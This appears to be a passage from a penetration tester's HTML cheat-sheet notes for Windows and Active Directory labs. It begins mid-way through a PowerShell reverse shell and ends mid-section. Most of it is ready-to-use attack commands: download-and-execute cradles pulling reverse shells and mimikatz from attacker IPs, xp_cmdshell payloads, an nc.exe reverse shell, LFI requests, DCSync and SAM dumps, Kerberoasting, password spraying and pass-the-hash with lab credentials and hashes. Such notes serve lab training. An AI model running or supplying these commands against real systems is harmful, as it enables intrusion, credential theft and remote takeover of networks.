+ &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()<br /><br /><br /><strong>#call example</strong><br />http://10.10.176.61/uploads/shell.php?cmd=powershell -nop -c &quot;....&quot;</div><div class='page'><h1 class='title level-1'>web servers</h1><br/> <strong><span style="color:#ff0000;">WEB SERVER</span></strong><br /> <br /> <br />  <br /><br /></div><div class='page'><h1 class='title level-2'>IEX downloadString</h1><br/><strong><span style="color:#0000ff;">IEX DOWNLOADSTRING</span></strong><br /><strong>rlwrap</strong> <strong>nc -nlvp 9001</strong><br /><strong>python -m SimpleHTTPServer</strong><br /><strong>powershell IEX(New-Object Net.WebClient).downloadString</strong>(&#39;http://10.10.14.18:8000/Invoke-PowerShellTcp.ps1&#39;); 														<strong>#returns shell </strong>(shell execution<strong> inside file*</strong>**)<br /><br /><strong><span style="color:#0000ff;">#converted base64</span></strong><br /><strong>echo -n</strong> &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.11:8000/Invoke-PowerShellTcp.ps1&#39;)&quot; <strong>| iconv -t UTF-16LE | base64 -w0</strong>			<br /> <br /><br />***<strong>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.8 -Port 9001</strong><br /><br /><br /><br /><br /><br />	</div><div class='page'><h1 class='title level-2'>IEX downloadFIle</h1><br/><strong><span style="color:#0000ff;">DOWNLOAD FILE</span></strong><br /><strong>python -m SimpleHTTPServer</strong><br /><strong>powershell</strong> &quot;(New-Object Net.WebClient).<strong>DownloadFile</strong>(&#39;<a href="http://10.8.185.233:80/shell.exe','shell.exe">http://10.10.14.11:8000/</a><a href="http://10.8.185.233:80/shell.exe','shell.exe">mimikatz.exe</a><a href="http://10.8.185.233:80/shell.exe','shell.exe">&#39;,&#39;mimikatz.exe</a>&#39;)&quot;<br /><strong>.\mimikatz.exe</strong><br /></div><div class='page'><h1 class='title level-2'>smbserver</h1><br/><strong><span style="color:#ff0000;">SMBSERVER</span></strong><strong><span style="color:#0000ff;">   </span></strong><br /><strong><span style="color:#0000ff;">#config</span></strong><br /><strong>/etc/samba/smb.conf</strong><br /><br /><strong>smbserver.py</strong> share . <strong>-smb2support</strong><br />#oppure<br /><strong>impacket-smbserver</strong> share .<span style="color:#0000ff;"> </span><strong>-smb2support</strong><br /><br /> <br /> <br />  <br /></div><div class='page'><h1 class='title level-3'>smbserver.py</h1><br/><strong><span style="color:#0000ff;">ATTACKER</span></strong><span style="color:#0000ff;">	</span>	<br /><strong>smbserver.py</strong> share . <strong>-smb2support</strong>																						<br /><strong>smbserver.py </strong>smb . <strong>-smb2support</strong> <strong>-user</strong> ippsec <strong>-password</strong> PleaseSubscribe   <span style="color:#4d4d4d;"> 						</span><strong><span style="color:#4d4d4d;">#with usn, psw</span></strong><br /><strong>#test if local server is running</strong><br /><strong>smbclient</strong> \\10.10.14.18\share  </div><div class='page'><h1 class='title level-3'>net use/ New-PSDrive</h1><br/><strong><span style="color:#0000ff;">VICTIM<br />#mount share</span></strong> <br /><span style="color:#0000ff;">#</span><strong><span style="color:#0000ff;">net use</span></strong><br /><strong>net use \\10.10.14.7\share</strong>		<br /><strong>#with usn, psw		</strong>					<br />net use \\10.10.14.7\<strong>share</strong> <strong>/u:</strong>df<strong> </strong>df							<strong>	</strong><br />net use <strong>k:</strong> \\10.10.14.7\<strong>smb</strong> <strong>/user</strong>:ippsec PleaseSubscribe<br /><strong>net use</strong> <strong>x:</strong> \\10.10.14.7\share        									<strong>#x:drive letter to map network resource to  (x: to access from terminal)</strong><br /><br /><strong><span style="color:#0000ff;">#</span></strong><strong><span style="color:#0000ff;">New-PSDrive</span></strong><br /><strong>New-PSDrive -Name </strong>&quot;prova&quot; <strong>-PSProvider</strong> &quot;FileSystem&quot; <strong>-Root</strong> &quot;\\10.10.14.8\<strong>share</strong>&quot;<br />cd prova<strong>: </strong>      																									<strong>#from box</strong><br /><br /><br /><strong><span style="color:#0000ff;">#copy files</span></strong><br />copy 20210816053552_BloodHound.zip <strong>\\10.10.14.7\share\</strong>							#copy file to me<br /><strong>cp</strong> C:\Users\kohsuke\Documents\<strong>CEH.kdbx</strong> .  									<strong>		</strong><br /><strong><span style="color:#0000ff;">#unmount share</span></strong><br /><strong>net use</strong> <strong>x:</strong> /delete</div><div class='page'><h1 class='title level-3'>Windows access</h1><br/><strong><span style="color:#0000ff;">WINDOWS ACCESS</span></strong><br /><strong>smbserver.py </strong>tools<strong> </strong>.<strong> -smb2support -user</strong> test <strong>-password </strong>test<br /><br /><strong><span style="color:#0000ff;">#from windows</span></strong><br /><strong>windows → esegui</strong><br /><strong>\\192.168.1.108\tools </strong>     			#usn:test,psw:test, ip=eth0<br /><strong>#drag and drop</strong><br /><br /><strong><span style="color:#0000ff;">#EvilWinRM</span></strong><br /><strong>upload </strong>tools/Seatbelt.exe    #download in victim from evilwm share</div><div class='page'><h1 class='title level-3'>Burpsuite</h1><br/><strong><span style="color:#0000ff;">BURPSUITE</span></strong><br /><strong>smbserver</strong>.py <strong>htb</strong> <strong>.</strong> -smb2support  <br /><strong><span style="color:#0000ff;">#on BurpSuite</span></strong><br /> ….?lang=\\10.10.14.18\htb\<strong>shell.php     																	 #get request  </strong><br />     ippsec=\\10.10.14.18\htb\<strong>nc.exe</strong>+10.10.14.18+9001+-<strong>e+powershell  		#post on ippsec</strong></div><div class='page'><h1 class='title level-3'>wbadmin</h1><br/><strong><span style="color:#0000ff;">WBADMIN 																				#backup volumes</span></strong><br /><strong>smbserver.py </strong>share<strong> . -smb2support</strong><br />echo y | <strong>wbadmin start backup -backuptarget:</strong>\\10.10.14.7\<strong>share -include:</strong>c:\windows\ntds\<br /></div><div class='page'><h1 class='title level-2'>InvokeWebRequest</h1><br/><strong><span style="color:#0000ff;">INVOKE-WEBREQUEST</span></strong><br /><strong>python3 -m http.server</strong><br /><strong>powershell</strong> -c &quot;<strong>Invoke-WebRequest</strong> <strong>-uri</strong> &#39;http://10.8.185.233:<strong>8000</strong>/shell.exe&#39; <strong>-outfile </strong>&#39;C:\windows\temp\revshell.exe&#39; &quot;<br />./revshell.exe<br /><br /><strong>python3 -m http.server</strong><br /><strong>powershell -c</strong> &quot;<strong>Invoke-WebRequest </strong>http://10.8.185.233/JuicyPotato.exe <strong>-outfile</strong> j.exe&quot;<br />./j.exe</div><div class='page'><h1 class='title level-2'>SQL server</h1><br/><strong><span style="color:#ff0000;">SQL server</span></strong><br /><strong>SQL server ps1 dwnl</strong><br /><br /><strong><span style="color:#0000ff;">#xp_cmdshell</span></strong><br />xp_cmdshell &quot;<strong>powershell</strong> &quot;<strong>Import-Module Microsoft.PowerShell.Utility</strong>&quot;<br />xp_cmdshell &quot;<strong>powershell</strong> <strong>iex</strong> (New-Object Net.WebClient).<strong>DownloadString</strong>(\&quot;http://10.10.14.113/shell.ps1\&quot;);&quot;&quot;<br /></div><div class='page'><h1 class='title level-1'>important file/directories</h1><br/><strong><span style="color:#0000ff;">IMPORTANT DIRECTORY</span></strong><br />C:\Windows\System32<strong>\spool\drivers\color </strong>  				#exception<br /><strong>#web folder</strong><br /><strong>C:\inetpub\wwwroot</strong>														<br /><br /><strong><span style="color:#0000ff;">IMPORTANT FILES</span></strong><br />/windows/system32/<strong>license.rtf </strong> <br />/windows/<strong>win.ini </strong> <br /><br /><strong><span style="color:#0000ff;"> #Session cookies</span></strong> (<strong>sess_&lt;cookie&gt;</strong>)<br /> <strong>/windows/temp/sess_</strong>923nktm0vmmi12qrptls332t5o  </div><div class='page'><h1 class='title level-1'>hashing</h1><br/><strong><span style="color:#ff0000;">HASHING</span></strong></div><div class='page'><h1 class='title level-2'>hydra</h1><br/><strong><span style="color:#0000ff;">HYDRA</span></strong><br /><strong>hydra -t 1 -V -f -l </strong>mirco<strong> -P </strong>rockyou.txt<strong> rdp</strong>://10.10.17.119<br /> </div><div class='page'><h1 class='title level-2'>hashcat</h1><br/><strong><span style="color:#0000ff;">HASHCAT</span></strong><br /><strong>hashcat -a 0 -m 1000</strong> hashforcrack.txt rockyou.txt<strong> --force --username --show  										#1000=NTLM</strong>						<strong>	windows user usn:psw</strong></div><div class='page'><h1 class='title level-2'>john the ripper</h1><br/><strong><span style="color:#0000ff;">JOHN THE RIPPER</span></strong><br /><strong>john --format=NT</strong> --wordlist=rockyou.txt hashforcrack.txt   																#<strong>windows</strong></div><div class='page'><h1 class='title level-1'>database</h1><br/></div><div class='page'><h1 class='title level-2'>microsoft database</h1><br/><strong><span style="color:#0000ff;">MICROSOFT DATABASE (MDB)</span></strong><br /><strong>mdb-sql </strong>backup.mdb<br /> <strong>&gt; list tables     </strong> 														#es: auth_user<br /> <strong>&gt; go</strong><br /><strong>mdb-tables </strong>backup.mdb<strong> | grep </strong>--color=auto<strong> user</strong><br /><strong>mdb-export </strong>backup.mdb <strong>auth_user</strong><br /></div><div class='page'><h1 class='title level-1'>web applications</h1><br/> <strong><span style="color:#0000ff;">Directory</span></strong><br /><strong>C:\inetpub\wwwroot</strong><br /></div><div class='page'><h1 class='title level-2'>local file inclusion (LFI)</h1><br/><strong><span style="color:#ff0000;">LFI (LOCAL FILE INCLUSION)</span></strong><br />smbserver.py <strong>htb</strong> . -smb2support<br />\\10.10.14.18\htb\<strong>shell.php</strong>&amp;ippsec=whoami<br />      <br /><strong><span style="color:#0000ff;">#curl</span></strong><br /><strong>curl -X GET</strong> http://10.10.10.151/blog/<strong>?</strong>lang=/windows/<strong>win.ini</strong><br /></div><div class='page'><h1 class='title level-1'>RDP</h1><br/><strong><span style="color:#0000ff;">RDP</span></strong> <strong><span style="color:#0000ff;">(Remote Desktop Protocol) 	</span></strong>		<strong><span style="color:#0000ff;">(port 3389)</span></strong><br /><strong>xfreerdp </strong>/dynamic-resolution +clipboard /cert:ignore /v:10.10.176.161 /u:Administrator /p:&#39;TryH4ckM3!&#39;<br /></div><div class='page'><h1 class='title level-1'>rpcclient</h1><br/><strong><span style="color:#ff0000;">RPCCLIENT  </span></strong><strong><span style="color:#0000ff;">  										#connect to RPC port</span></strong><br /><span style="color:#0000ff;">#</span><strong><span style="color:#0000ff;">anonymous login</span></strong><br /><strong>rpcclient </strong>10.10.10.175     												<br /><span style="color:#0000ff;">#</span><strong><span style="color:#0000ff;">null user</span></strong><br /><strong>rpcclient -U &quot;&quot;</strong> -N<strong> 10.10.10.161</strong>    		<br /><strong><span style="color:#0000ff;">#given user</span></strong><br /><strong>rpcclient -U &quot;support&quot; </strong>10.10.10.192   							<br /><strong><span style="color:#0000ff;">#user + psw</span></strong><br /><strong>rpcclient -U</strong> &#39;hazard<strong>%</strong>stealth1agent&#39; 10.10.10.149  	<br /> <br />  <br /> <br />  <br /><br /> <br />  <br /><br /><br /><br /></div><div class='page'><h1 class='title level-2'>enumdomusers/groups</h1><br/><strong><span style="color:#0000ff;">#ENUMDOMUSERS/ ENUMDOMGROUPS</span></strong><br /><strong>&gt; enumdomusers                            </strong>  #users + RID<br />&gt; <strong>enumdomgroups</strong><br /> </div><div class='page'><h1 class='title level-2'>lookupnames/sids</h1><br/><strong><span style="color:#0000ff;">#LOOKUPNAMES </span></strong> <br /><strong>&gt; lookupnames </strong>administrator <strong> 										#</strong>returns<strong> </strong><strong><span style="color:#0000ff;">SID</span></strong><strong> </strong><strong><span style="color:#0000ff;">(domain+user)</span></strong><span style="color:#0000ff;">	</span>			 <strong>    es: </strong>S-1-5-21-4254423774-1266059056-3197185112-<strong>500</strong><br /><strong>&gt; lookupnames </strong>guest          											#es: <strong>501</strong><br />&gt; <strong>lookupnames </strong>hazard          											#es: <strong>1008</strong><br /><br /><br /><strong><span style="color:#0000ff;">#LOOKUPSIDS</span></strong><br />&gt; <strong>lookupsids </strong>S-1-5-21-4254423774-1266059056-3197185112-<strong>503  </strong>									#search user by a number<br />&gt; <strong>lookupsids </strong>S-1-5-21-4254423774-1266059056-3197185112-<strong>1013</strong></div><div class='page'><h1 class='title level-2'>queryuser/groups</h1><br/><strong><span style="color:#0000ff;">#QUERY</span></strong><br />&gt; <strong>querydispinfo    </strong>						#vd enumdom<br /><br /><strong><span style="color:#0000ff;">#QUERYUSER</span></strong><br />&gt; <strong>queryuser</strong> 0x47b    					<strong>#user RID</strong><br />&gt; <strong>queryuser</strong> steve<br /><strong><span style="color:#0000ff;">#queryusergroups</span></strong><br />&gt;<strong> queryusergroups</strong> 0x47b  		#user RID<br /><br /><strong><span style="color:#0000ff;">#QUERYGROUP</span></strong><br />&gt;<strong> querygroup </strong>0x201      				<strong>#group RID</strong><br />&gt; <strong>querygroupmem</strong> 0x44f  			#user RIDs</div><div class='page'><h1 class='title level-2'>setuserinfo</h1><br/><strong><span style="color:#0000ff;">#CHANGE PASSWORD</span></strong><br /><strong>&gt; setuserinfo2 </strong>Audit2020<strong> 23 </strong>&#39;pro123!&#39;     				#then use <strong>crackmapexec smb 10.10.10.192  -u &#39;Audit2020&#39; -p &#39;pro123!&#39;</strong></div><div class='page'><h1 class='title level-1'>kerberos</h1><br/> <strong><span style="color:#ff0000;">KERBEROS          </span></strong><strong><span style="color:#0000ff;">(port 88)</span></strong><br /></div><div class='page'><h1 class='title level-2'>kerbrute</h1><br/><strong><span style="color:#0000ff;">KERBRUTE  																		#finds valid users</span></strong>			 (in<strong> etc/hosts</strong>  	 → 			10.10.104.142 <strong>spookysec.local</strong>)    <br /><strong>./kerbrute userenum --dc </strong>10.10.10.192<strong> -d </strong>BLACKFIELD<strong> users.txt</strong>													#<strong>--dc = domaincontroller</strong>, <strong>-d = domain</strong><br /><strong>./kerbrute userenum --dc </strong>spookysec.local <strong>-d </strong>spookysec.local<strong> users.txt</strong> -t 100<br /><strong>./kerbrute userenum --dc </strong>10.10.10.175<strong> -d </strong>EGOTISTICAL-BANK.LOCAL<strong> users.txt</strong><br /> <br /><strong><span style="text-decoration:underline;">users.txt</span></strong><br />administrator <br />guest<br />Fergus Smith<br />Fergus.Smith<br />F.Smith<br />FSmith<br /></div><div class='page'><h1 class='title level-2'>rubeus</h1><br/><strong><span style="color:#0000ff;">RUBEUS    (TICKETS)  </span></strong><br /><strong>Rubeus.exe harvest /interval:30     </strong>											#ticket <strong>harvesting</strong> TGTs<br />echo 10.10.202.156 CONTROLLER.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts<br /><br /><span style="color:#0000ff;">#</span><strong><span style="color:#0000ff;">password spraying</span></strong><br /><strong>Rubeus.exe brute /password:Password1 /noticket  </strong>				# .kirbi TGT<br /><br /><br /><br /><strong><span style="color:#0000ff;">#kerberoast</span></strong><br /><strong>Rubeus.exe kerberoast </strong>  												 		 #returns hash <br />hashcat <strong>-m 13100 </strong>-a 0 hashforcrack.txt Pass.txt<br /> <br /><strong><span style="color:#0000ff;">#asreproast</span></strong><br /><strong>Rubeus.exe asreproast     													 </strong># $krb5asrep$<strong>23$</strong>User<br />hashcat -m <strong>18200 </strong>hashforcrack.txt<strong> </strong>Pass.txt<br /></div><div class='page'><h1 class='title level-1'>impacket</h1><br/><strong><span style="color:#ff0000;">IMPACKET</span></strong>					<br />locate <strong>psexec.py </strong>  						#to find cme directory			(/opt/impacket/examples)<br /></div><div class='page'><h1 class='title level-2'>GetADUsers</h1><br/><strong><span style="color:#0000ff;">GETADUSERS</span></strong>																											#query domains for useer data<br /><strong>GetADUsers.py -all -dc-ip</strong> 10.10.10.100 active.htb/SVC_TGS  							<strong>#list users</strong><strong><span style="color:#0000ff;">  </span></strong><strong>	</strong>			#<strong>-dc-ip</strong> = domain controller ip					<strong>#domain/username</strong><br /><strong>GetADUsers.py</strong> <strong>-dc-ip</strong> 10.10.10.175 egotistical-bank.local/ <strong>-debug </strong><br /></div><div class='page'><h1 class='title level-2'>GetUserSPNs</h1><br/><strong><span style="color:#0000ff;">GETUSERSPNS</span></strong>									<strong>#quey target domains for SPNs running under an user</strong><br /><strong><span style="color:#0000ff;">#get administrator Kerberos ticket (TGS)  </span></strong>													   <br /><strong>GetUserSPNs.py -request</strong> active.htb<strong>/SVC_TGS -dc-ip</strong> 10.10.10.100 														#-<strong>request</strong>=requests TGS<br /><strong>GetUserSPNs.py -request </strong>controller.local/Machine1:<strong>Password1 -dc-ip </strong>10.10.157.68  <br /><strong>GetUserSPNs.py</strong> <strong>-request </strong>active.htb<strong>/</strong>SVC_TGS:GPPstillStandingStrong2k18 <strong>-outputfile</strong> admin.txt<br /><br /><strong><span style="color:#4d4d4d;">#cracking TGS</span></strong><br />hashcat <strong>-m 13100</strong> hashforcrack.txt rockyou.txt       <strong>--force</strong>																			<strong>#then go to psexec</strong><br /></div><div class='page'><h1 class='title level-2'>GetNPUsers</h1><br/><strong><span style="color:#0000ff;">GETNPUSER   </span></strong>									<strong>#queries taget domains for user that don&#39;t require Kerberos pre-authentication, exports TGT ticket for cracking</strong> (<strong>kerberoasting</strong>) (<strong>ASREPRoasting</strong> attack)<br /><strong>GetNPUsers.py </strong>EGOTISTICAL-BANK.local/<strong>fsmith    																	#domain/username </strong><br /><strong>GetNPUsers.py -dc-ip</strong> 10.10.10.161 htb.local/<strong>svc-alfresco -no-pass</strong><br /><strong><span style="color:#0000ff;">#userlist</span></strong><br /><strong>GetNPUsers.py -dc-ip</strong> 10.10.10.192 BLACKFIELD/ <strong>-usersfile </strong>users.txt <strong>-no-pass</strong><br /><br /><strong><span style="color:#0000ff;">#request TGT</span></strong><br /><strong>GetNPUsers.py -dc-ip</strong> 10.10.157.78<strong> </strong>spookysec.local/<strong>svc-admin -request -no-pass</strong>  			<br /><strong>GetNPUsers.py -dc-ip</strong> 10.10.10.161 <strong>-request</strong> <strong>&#39;</strong>htb.local/<strong>&#39;</strong><br /><strong>GetNPUsers.py</strong> <strong>-dc-ip </strong>10.10.10.161<strong> -request</strong> &#39;htb.local/&#39; <strong>-format </strong>hashcat							#format to save <strong>AS_REQ</strong><br /><br /><br /><strong><span style="color:#4d4d4d;">#cracking TGT</span></strong><br />hashcat <strong>-m 18200</strong> hashforcrack.txt rockyou.txt   																			#finds smb <strong>password </strong>of fsmith<strong>     </strong> <br /></div><div class='page'><h1 class='title level-2'>lookupsid</h1><br/><strong><span style="color:#0000ff;">LOOKUPSID       </span></strong>																#<strong>SID</strong>/<strong>RID</strong> <strong>bruteforcing</strong> (after cme) (<strong>secure identifier</strong>, <strong>relative identifier</strong>)<br /><strong>lookupsid.py </strong>&#39;hazard:stealth1agent&#39;<strong>@</strong>10.10.10.149									<br /></div><div class='page'><h1 class='title level-2'>secretsdump</h1><br/><strong><span style="color:#ff0000;">SECRETSDUMP    </span></strong>  																													<strong><span style="color:#0000ff;">#DCSync attack   </span></strong><br /><strong>secretsdump.py</strong> <strong>egotistical-bank.local/svc_loanmgr@</strong>10.10.10.175   									<strong>	#domain/user@domain controller</strong>			#return hash<br /><strong>secretsdump.py</strong> <strong>htb/ippsec@</strong>10.10.10.161<br /><strong><span style="color:#0000ff;">#usn+password</span></strong><br /><strong>secretsdump.py</strong> <strong>htb.local</strong>/ippsec<strong>:</strong>PleaseSub@10.10.10.161<br /><strong>secretsdump.py -dc-ip 10.10.157.78 </strong>spookysec.local/backup:backup2517860@10.10.157.78<br /><br /><strong><span style="color:#0000ff;">#windows credentials</span></strong><br /><strong><span style="color:#0000ff;">#SAM file</span></strong><br /><strong>secretsdump.py -sam </strong>SAM<strong> -system </strong>SYSTEM<strong> local            </strong>															#returns hashes<br /><strong><span style="color:#0000ff;">#NTDS file</span></strong><br /><strong>secretsdump.py -ntds</strong> ntds.dit <strong>-system</strong> system.hive <strong>LOCAL</strong>  														#domain controller hash dump<br /><strong>secretsdump.py -ntds</strong> ntds.dit <strong>-system</strong> system.hive <strong>-history</strong> <strong>LOCAL</strong><br /><br /><br /><br /><br />C://Windows/System32/<strong>config/SAM    </strong><br />C://Windows/System32/<strong>config</strong>/<strong>SYSTEM</strong><br /></div><div class='page'><h1 class='title level-1'>LDAP</h1><br/><strong><span style="color:#ff0000;background-color:#ffff00;">LDAP</span></strong><strong><span style="color:#ff0000;">    </span></strong><strong><span style="color:#0000ff;">(port 389)</span></strong><br /></div><div class='page'><h1 class='title level-2'>ldapsearch</h1><br/><strong><span style="color:#0000ff;">LDAPSEARCH</span></strong><br /><strong>ldapsearch -x -h</strong> 10.10.10.161      														<strong>		#-x= anonymous authentication</strong><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>namingcontext</h1><br/><strong><span style="color:#0000ff;">#NAMINGCONTEXT</span></strong><br /><strong>ldapsearch -x -h </strong>10.10.10.175<strong> -s base</strong> <strong>namingcontexts   									#-s = scope 					returns DC=</strong>htb<strong>,DC=</strong>local …</div><div class='page'><h1 class='title level-3'>domain controller</h1><br/><strong><span style="color:#0000ff;">#DOMAIN CONTROLLER</span></strong><br /><strong>ldapsearch</strong> <strong>-x -h </strong>10.10.10.161<strong> -b &quot;DC</strong>=htb<strong>,DC</strong>=local<strong>&quot;   															#-b = search query					#DC=scope</strong><br /><strong>ldapsearch</strong> <strong>-x -h </strong>10.10.10.161<strong> -b &quot;DC</strong>=htb<strong>,DC</strong>=local<strong>&quot; &#39;(objectClass=Person)&#39;</strong><br /><strong>#domain + password</strong><br /><strong>ldapsearch -x -h </strong>10.10.10.100<strong> -p </strong>389<strong> -b &quot;DC=</strong>active<strong>,DC=</strong>htb<strong>&quot;</strong> <strong>-D</strong> &#39;SVC_TGS<strong>&#39; -w &#39;</strong>GPPstillStandingStrong2k18<strong>&#39;</strong></div><div class='page'><h1 class='title level-3'>samAccountName</h1><br/><strong><span style="color:#0000ff;">#SAMACCOUNTNAME</span></strong><br /><strong>ldapsearch -x -h 10.10.10.175 -b </strong>&quot;<strong>DC</strong>=EGOTISTICAL-BANK,<strong>DC</strong>=LOCAL&quot;<strong> &#39;(objectClass=Person)&#39; sAMAccountName  </strong> <br /><br /><strong>ldapsearch -x -h 10.10.10.161 -b &quot;DC=</strong>htb<strong>,DC=</strong>local<strong>&quot; &#39;(objectClass=Person)&#39; sAMAccountName</strong> | <strong>grep</strong> sAMAccountName<br /><strong>ldapsearch -x -h 10.10.10.161 -b &quot;DC=</strong>htb<strong>,DC=</strong>local<strong>&quot; </strong>&#39;(objectClass=Person)&#39;<strong> </strong>sAMAccountName | <strong>grep</strong> sAMAccountName |<strong> awk &#39;{print $2}&#39; &gt; </strong>userlist.ldap  <strong>   </strong>		#takes only 2 part of row</div><div class='page'><h1 class='title level-3'>subtree</h1><br/><strong><span style="color:#0000ff;">#SUBTREE</span></strong>													<strong><span style="color:#0000ff;">#dump: find usernames + passwords </span></strong><strong> (es sAMAccountName,</strong> to use with <strong>cme)</strong><br /><strong>ldapsearch</strong> <strong>-x -h</strong> 10.10.10.175<strong> -s sub -b </strong>&#39;<strong>DC=</strong>EGOTISTICAL-BANK,<strong>DC=</strong>LOCAL&#39;							<strong>#-s=subtree</strong><br /><strong>ldapsearch</strong> <strong>-x -h</strong> 10.10.10.182<strong> -s sub -b </strong>&#39;<strong>DC=</strong>cascade<strong>,DC=</strong>local&#39;  &gt; tmp<strong> </strong> <br />cat tmp | <strong>awk</strong> &#39;{print $1}&#39; | <strong>sort</strong> | <strong>uniq -c</strong> |<strong> sort -nr</strong> | grep &#39;:&#39;   																	#: deletes base64<br /><br />  <br /></div><div class='page'><h1 class='title level-2'>windapsearch</h1><br/><strong><span style="color:#0000ff;">WINDAPSEARCH</span></strong><br /><strong>#enumerate all AD users</strong><br />python3<strong> ./windapsearch.py -d </strong>egotistical-bank.local <strong>--dc-ip </strong>10.10.10.175<strong> -U </strong> 							<br />python3 <strong>./windapsearch.py -U --full --dc-ip </strong>10.10.10.182													<strong>#-full=dump all form LDAP</strong><br /></div><div class='page'><h1 class='title level-1'>crackmapexec</h1><br/> <strong><span style="color:#ff0000;">CRACKMAPEXEC</span></strong><strong><span style="color:#0000ff;">   </span></strong><strong>  </strong><br /><br /></div><div class='page'><h1 class='title level-2'>SMB</h1><br/><strong><span style="color:#ff0000;">SMB</span></strong> <strong><span style="color:#0000ff;">(port 445)</span></strong><strong> </strong>												<strong>	</strong><br />crackmapexec<strong> smb</strong> 10.10.10.175					#smb login bruteforce<br /> <br /><strong><span style="color:#0000ff;">#given user/psw       </span></strong><br /><strong>crackmapexec smb</strong> 10.10.10.161 <strong>-u</strong> svc-alfresco <strong>-p</strong> s3rvice									#<strong>see if pwned → write access</strong><br /><strong>crackmapexec smb</strong> 10.10.10.175 <strong>-u</strong> fsmith <strong>-p</strong> Thestrokes23 <br /><br /><strong><span style="color:#0000ff;">#given hash (secretsdump/mimikatz)   </span></strong><br /><strong>crackmapexec</strong> smb 10.10.10.161 <strong>-u </strong>administrator<strong> -H</strong> 32693b11e6aa90eb43d32c72a07ceea6  							#then use <strong>psexec</strong><br /><br /><strong><span style="color:#0000ff;">#spider</span></strong><br /><strong>crackmapexec smb</strong> 10.10.10.182 <strong>-u </strong>r.thompson <strong>-p </strong>rY4n5eva <strong>-M spider_plus</strong><br /><br /><br /></div><div class='page'><h1 class='title level-3'>users</h1><br/><strong><span style="color:#0000ff;">USERS</span></strong><br />crackmapexec<strong> smb</strong> 10.10.10.161 <strong>--users</strong><br /><br /><span style="color:#0000ff;"> </span><strong><span style="color:#0000ff;">#given user list</span></strong><br /><strong>crackmapexec smb</strong> 10.10.10.149 <strong> -u users.txt -p </strong>passwords.txt<br /><strong>crackmapexec</strong> <strong>smb</strong> 10.10.10.169 <strong>-u </strong>users.txt <strong>-p </strong>&#39;Welcome123!&#39;</div><div class='page'><h1 class='title level-3'>shares</h1><br/><strong><span style="color:#0000ff;">SHARES</span></strong><br /><strong>crackmapexec smb </strong>10.10.10.175<strong> --shares</strong><br /><strong>crackmapexec smb </strong>10.10.10.175<strong> --shares -u </strong>&#39;&#39; <strong>-p </strong>&#39;&#39;										<strong>#null login</strong><br /><br /><strong>crackmapexec</strong> <strong>smb</strong> 10.10.10.192 <strong>--shares -u </strong>&#39;anonymous&#39; <strong>-p</strong> &#39;&#39;					<strong>#anonymous login</strong><br /><br />crackmapexec smb 10.10.10.161 <strong>-u </strong>svc-alfresco <strong>-p</strong> s3rvice <strong>--shares</strong><br /><strong>crackmapexec smb </strong>10.10.10.149<strong> -u </strong>users.txt<strong> -p </strong>passwords.txt <strong>--shares</strong></div><div class='page'><h1 class='title level-3'>policies</h1><br/><strong><span style="color:#0000ff;">#POLICIES</span></strong><br />crackmapexec<strong> smb </strong>10.10.10.161<strong> --pass-pol    							#account lockout th.</strong><br />crackmapexec <strong>smb</strong> 10.10.10.161 --pass-pol <strong>-u &#39;&#39; -p &#39;&#39;</strong></div><div class='page'><h1 class='title level-3'>RID bruteforcing</h1><br/><strong><span style="color:#0000ff;">#RID bruteforcing</span></strong><br /><strong>crackmapexec smb 10.10.10.149 -u </strong>hazard<strong> -p </strong>stealth1agent <strong>--rid-brute</strong></div><div class='page'><h1 class='title level-3'>smblogin (metasploit)</h1><br/><strong><span style="color:#0000ff;">SMBLOGIN	</span></strong><br /><strong>msfdb run     													</strong>#credentials<br />use auxiliary/scanner/smb/<strong>smb_login</strong><br />setg <strong>USER_FILE</strong> users.txt<br />setg <strong>PASS_FILE</strong> password.txt<br />setg <strong>RHOST </strong>10.10.10.149<br />run      <br /><br /><span style="color:#0000ff;">#</span><strong><span style="color:#0000ff;">winrm also with smblogin</span></strong><br />use auxiliary/scanner/winrm/<strong>winrm  </strong>								#after smblogin, to see if we can have a<strong> low priv shell</strong><br />run<br /></div><div class='page'><h1 class='title level-2'>winrm</h1><br/><strong><span style="color:#ff0000;">WINRM</span></strong><strong><span style="color:#0000ff;"> (port 5985)   			#Windows Remote Management   </span></strong>(pwned)<br /><strong><span style="color:#0000ff;">#user+password</span></strong><br /><strong>crackmapexec winrm </strong>10.10.10.149<strong> -u </strong>hazard<strong> -p </strong>stealth1agent<br /><strong>crackmapexec winrm </strong>10.10.10.169<strong> -u </strong>melanie<strong> -p </strong>&#39;Welcome123!&#39;<strong> -X </strong>&quot;whoami /all&quot;  										<strong>#X=command</strong><br /><strong>crackmapexec</strong> <strong>winrm</strong> 10.10.10.169 <strong>-u</strong> users.txt <strong>-p</strong> &#39;Welcome123!&#39;<br /><br /><strong><span style="color:#0000ff;">#given hash</span></strong><br /><strong>crackmapexec winrm</strong> 10.10.10.192 <strong>-u</strong> svc_backup <strong>-H</strong> 9658d1d1dcd9250115e2205d9f48400d<br /></div><div class='page'><h1 class='title level-1'>evil-winrm</h1><br/><strong><span style="color:#ff0000;">EVIL-WIRM</span></strong><strong>												(winrm shell) </strong> #<strong>login after pwned winrm</strong><br /><strong><span style="color:#0000ff;">#user+password</span></strong><br /><strong>evil-winrm -i </strong>10.10.10.175<strong> -u </strong>fsmith <strong>-p </strong>Thestrokes23<br /><strong>evil-winrm</strong> <strong>-i</strong> 10.10.10.149 <strong>-u</strong> chase <strong>-p </strong>&#39;Q4)sJu\Y8qz*A3?d&#39;<br /><br /><strong><span style="color:#0000ff;">#given hash   </span></strong><strong>																#</strong>use<strong> secretsdump/mimikatz</strong><br /><strong>evil-winrm -i </strong>10.10.157.78 <strong>-u </strong>administrator<strong> -H</strong> e4876a80a723612986d7609aa5ebc12b<br /><strong>evil-winrm -i </strong>10.10.10.192<strong> -u </strong>svc_backup <strong>-H </strong>9658d1d1dcd9250115e2205d9f48400d<br /></div><div class='page'><h1 class='title level-1'>privilege escalation</h1><br/><strong><span style="color:#ff0000;">PRIVILEGE ESCALATION</span></strong></div><div class='page'><h1 class='title level-2'>winpeas</h1><br/><strong><span style="color:#ff0000;">WINPEAS</span></strong><br /><strong><span style="color:#0000ff;">#Invoke-WebRequest</span></strong><br />python -m <strong>SimpleHTTPServer</strong><br 